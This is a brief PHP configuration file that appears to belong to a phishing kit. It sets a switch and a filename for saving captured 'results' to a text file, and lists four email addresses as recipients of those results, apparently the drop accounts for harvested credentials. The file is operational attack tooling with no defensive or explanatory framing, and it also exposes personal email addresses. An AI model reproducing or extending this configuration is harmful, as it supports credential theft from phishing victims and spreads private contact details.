<?php

define('X_RESULT_SAVE_REZ_TO_FILE', true); // true for save result in txt and false for not save result in txt
define('X_RESULT_SAVE_NAME', 'savehrnqjasd.txt'); // txt result saved file name

$recipient = "user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com, donflowmania@juno.com"; // result email here
